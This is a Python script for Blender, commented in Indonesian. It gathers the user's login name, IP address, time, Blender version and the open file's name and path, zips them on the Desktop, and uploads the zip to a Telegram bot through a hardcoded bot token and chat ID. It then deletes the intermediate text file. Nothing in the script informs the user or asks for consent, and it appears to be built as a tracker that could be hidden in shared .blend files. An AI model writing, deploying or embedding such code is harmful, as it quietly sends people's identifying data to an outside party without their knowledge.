import os
import datetime
import getpass
import socket
import requests
import bpy
import zipfile

# ============================ INFORMASI USER & SISTEM ============================
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
username = getpass.getuser()

try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Tidak bisa mendapatkan IP"

blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"

# ============================ INFORMASI FILE BLENDER ============================
blend_path = bpy.data.filepath if bpy.data.filepath else "Belum disimpan"
blend_file = os.path.basename(blend_path)

# ============================ SIAPKAN TEKS UNTUK FILE ============================
data_text = f"""
👤 User        : {username}
🖥 IP          : {ip_address}
🕒 Time        : {current_time}
🔧 Blender     : {blender_version}
📄 File Name   : {blend_file}
📁 File Path   : {blend_path}
"""

# ============================ BUAT FILE TXT DI DESKTOP ============================
desktop = os.path.expanduser("~/Desktop")
txt_path = os.path.join(desktop, "log_info.txt")
zip_path = os.path.join(desktop, "log_info.zip")

with open(txt_path, "w", encoding="utf-8") as f:
    f.write(data_text)

# ============================ BUAT ZIP DENGAN PASSWORD ============================
with zipfile.ZipFile(zip_path, 'w') as zipf:
    zipf.setpassword(b"RR-TB")
    zipf.write(txt_path, arcname="log_info.txt")

# ============================ KIRIM FILE KE TELEGRAM ============================
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"
CHAT_ID = "-4023677425"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

with open(zip_path, "rb") as file:
    response = requests.post(TELEGRAM_URL, data={"chat_id": CHAT_ID}, files={"document": file})

if response.status_code == 200:
    print("✅ Berhasil mengirim file zip ke Telegram.")
else:
    print("❌ Gagal kirim:", response.text)

# ============================ HAPUS FILE TXT ============================
try:
    os.remove(txt_path)
except:
    print("⚠️ Gagal menghapus file .txt")